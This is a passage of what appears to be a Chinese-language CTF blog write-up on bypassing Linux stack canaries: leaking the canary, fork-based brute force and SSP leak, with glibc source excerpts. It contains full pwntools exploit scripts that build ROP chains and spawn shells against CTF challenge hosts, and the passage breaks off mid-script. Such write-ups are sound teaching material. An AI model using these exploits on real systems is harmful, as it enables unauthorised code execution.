class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./babystack\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.232.so\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"111.200.241.244\"</span>,<span class=\"number\">41155</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./babystack\")</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0000000000400a93</span></span><br><span class=\"line\">puts_plt = elf.sym[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x400908</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span> </span><br><span class=\"line\">sla(<span class=\"string\">'&gt;&gt; '</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,'b *0x4009DD')</span></span><br><span class=\"line\">sla(<span class=\"string\">'&gt;&gt; '</span>,<span class=\"string\">'2'</span>)</span><br><span class=\"line\">ru(<span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span>+<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">canary = u64(r(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))  </span><br><span class=\"line\">leak(<span class=\"string\">\"canary\"</span>,canary)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span> + p64(canary) + <span class=\"string\">b'A'</span>*<span class=\"number\">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'3'</span>)</span><br><span class=\"line\">puts = uu64(r(<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">leak(<span class=\"string\">'puts'</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x45216</span></span><br><span class=\"line\">leak(<span class=\"string\">'libc'</span>,libc_base)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x88</span> + p64(canary) + <span class=\"string\">b'A'</span>*<span class=\"number\">8</span> + p64(one_gadget)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'1'</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">sla(<span class=\"string\">\"&gt;&gt; \"</span>,<span class=\"string\">'3'</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-2Fork子进程程序爆破canary\"><a href=\"#3-2Fork子进程程序爆破canary\" class=\"headerlink\" title=\"3.2Fork子进程程序爆破canary\"></a>3.2Fork子进程程序爆破canary</h2><h3 id=\"NJCTF2017（messager）\"><a href=\"#NJCTF2017（messager）\" class=\"headerlink\" title=\"NJCTF2017（messager）\"></a>NJCTF2017（messager）</h3><p>看一下这个题</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155807161.png\" alt=\"image-20210221155807161\"></p>\n<p>函数主要逻辑是将flag从文件里取出，然后放到bss段，同时开通了一个socket发送flag函数send，目的就是控制这个函数</p>\n<p>此外，这个主进程每次还会fork一个子进程，让用户与400BE9进行交互</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221155843764.png\" alt=\"image-20210221155843764\"></p>\n<p>sub_400BE9函数里有栈溢出</p>\n<blockquote>\n<p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致</p>\n<p>通常情况下，我们爆破canary是不可能的，但由于同一个进程内复刻的子进程，它们的canaries是不变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会</p>\n<p>爆破是逐字节进行的，根据进程崩溃与否来判断填上去的字符串是否正确。</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_canary</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">\"\\x00\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> len(canary) &lt; <span class=\"number\">8</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">256</span>):</span><br><span class=\"line\">            p = process(<span class=\"string\">\"./messager\"</span>)</span><br><span class=\"line\">            p.recv()</span><br><span class=\"line\">            p.send(<span class=\"string\">\"A\"</span>*<span class=\"number\">104</span> + canary + chr(i))</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                p.recv()</span><br><span class=\"line\">                canary +=chr(x)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">                p.close()</span><br><span class=\"line\">    leak(<span class=\"string\">\"canary\"</span>,canary)</span><br><span class=\"line\">leak_canary()</span><br><span class=\"line\">p = process(<span class=\"string\">\"./messager\"</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">s(<span class=\"string\">\"A\"</span>*<span class=\"number\">104</span>+canary+<span class=\"string\">\"A\"</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x400bc6</span>))</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h3 id=\"fork中getshell\"><a href=\"#fork中getshell\" class=\"headerlink\" title=\"fork中getshell\"></a>fork中getshell</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">backdoor</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stderr</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">vul</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[<span class=\"number\">100</span>];</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(STDIN_FILENO, <span class=\"built_in\">buffer</span>, <span class=\"number\">120</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    init();</span><br><span class=\"line\">\t<span class=\"keyword\">pid_t</span> pid;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\tpid = fork();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pid &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"fork error\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(pid == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"welcome\"</span>);</span><br><span class=\"line\">\t\t\tvul();</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"recv sucess\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\twait(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">'./bin'</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bin\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'welcome\\n'</span>)</span><br><span class=\"line\">canary = <span class=\"string\">'\\x00'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0x100</span>):</span><br><span class=\"line\">        p.send(<span class=\"string\">'a'</span>*<span class=\"number\">100</span> + canary + chr(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">'welcome\\n'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'recv'</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">            canary += chr(i)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">'a'</span>*<span class=\"number\">100</span> + canary + <span class=\"string\">'a'</span>*<span class=\"number\">12</span> + p32(<span class=\"number\">0x80485FB</span>))</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"cat flag\"</span>)</span><br><span class=\"line\">flag = p.recv()</span><br><span class=\"line\">p.close()</span><br><span class=\"line\">log.success(<span class=\"string\">'flag is:'</span> + flag)</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-3-SSP-Stack-Smashing-Protect-Leak\"><a href=\"#3-3-SSP-Stack-Smashing-Protect-Leak\" class=\"headerlink\" title=\"3.3 SSP(Stack Smashing Protect) Leak\"></a>3.3 SSP(Stack Smashing Protect) Leak</h2><p><strong>SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。</strong></p>\n<p>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印<code>stack smashing detected</code></p>\n<p>看一下源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// debug/stack_chk_fail.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __fortify_fail (<span class=\"string\">\"stack smashing detected\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用函数 <code>__fortify_fail()</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// debug/fortify_fail.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn)) internal_function</span><br><span class=\"line\">__fortify_fail (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* The loop is added only to keep gcc happy.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    __libc_message (<span class=\"number\">2</span>, <span class=\"string\">\"*** %s ***: %s terminated\\n\"</span>,</span><br><span class=\"line\">                    msg, __libc_argv[<span class=\"number\">0</span>] ?: <span class=\"string\">\"&lt;unknown&gt;\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>\n<p><code>__fortify_fail()</code> 调用函数 <code>__libc_message()</code> 打印出错误信息和 <code>argv[0]</code>。</p>\n<p>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</unknown></p>\n<p><strong>但这种方法在libc2.26中已经修复</strong>（网上我找的是2.26修复，但有一篇文章是2.25，存疑）</p>\n<p>最后我们来看一下 libc-2.25 里的 <code>__stack_chk_fail</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __fortify_fail_abort (<span class=\"literal\">false</span>, <span class=\"string\">\"stack smashing detected\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br></pre></td></tr></table></figure>\n<p>它使用了新函数 <code>__fortify_fail_abort()</code>，这个函数是在 <a href=\"https://sourceware.org/git/?p=glibc.git;a=commit;h=ed421fca42fd9b4cab7c66e77894b8dd7ca57ed0\" target=\"_blank\" rel=\"noopener\">BZ #12189</a> 这次提交中新增的：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail_abort (<span class=\"built_in\">_Bool</span> need_backtrace, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* The loop is added only to keep gcc happy.  Don't pass down</span></span><br><span class=\"line\"><span class=\"comment\">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span></span><br><span class=\"line\"><span class=\"comment\">     may point to the corrupted stack.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class=\"line\">                    <span class=\"string\">\"*** %s ***: %s terminated\\n\"</span>,</span><br><span class=\"line\">                    msg,</span><br><span class=\"line\">                    (need_backtrace &amp;&amp; __libc_argv[<span class=\"number\">0</span>] != <span class=\"literal\">NULL</span></span><br><span class=\"line\">                     ? __libc_argv[<span class=\"number\">0</span>] : <span class=\"string\">\"&lt;unknown&gt;\"</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __fortify_fail_abort (<span class=\"literal\">true</span>, msg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br><span class=\"line\">libc_hidden_def (__fortify_fail_abort)</span><br></pre></td></tr></table></figure>\n<p>函数 <code>__fortify_fail_abort()</code> 在第一个参数为 <code>false</code> 时不再进行栈回溯，直接以打印出字符串 <code>&lt;unknown&gt;</code> 结束，也就没有办法输出 <code>argv[0]</code> 了。</p>\n<h3 id=\"wdb2018-guess\"><a href=\"#wdb2018-guess\" class=\"headerlink\" title=\"wdb2018_guess\"></a>wdb2018_guess</h3><p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221200044056.png\" alt=\"image-20210221200044056\"></p>\n<p>大概意思就是栈上读取flag.txt，然后让我们猜flag，但这里有fork就很可疑</p>\n<p>来复习一下fork</p>\n<blockquote>\n<p>Unix/Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，<strong>但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</strong></p>\n<p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p>\n</blockquote>\n<p><strong>先说一下思路，我们此时知道flag是在栈上的，无非就是泄露栈上的flag，但具体怎么做呢？</strong></p>\n<p><strong>要想泄露栈上的地址，我们这里需要用到<code>__environ</code></strong></p>\n<blockquote>\n<p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong></p>\n<p>1、得到libc地址后，libc基址+_environ的偏移量=_environ的地址 在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量和libc库有关  </p>\n<p>2、通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p>\n</blockquote>\n<ol>\n<li>通过argv[0]泄露got，从而得到基址</li>\n<li>泄露environ</li>\n<li>泄露flag</li>\n</ol>\n<p>首先我们要知道get的变量和argv[0]的offset</p>\n<p>可以看到是296</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &amp; __libc_argv[0]</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221223741272.png\" alt=\"image-20210221223741272\"></p>\n<p>接下来我们还需要知道environ和flag的offset,是360</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221224236237.png\" alt=\"image-20210221224236237\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27910</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./GUESS\"</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*<span class=\"number\">296</span> + p64(puts_got)</span><br><span 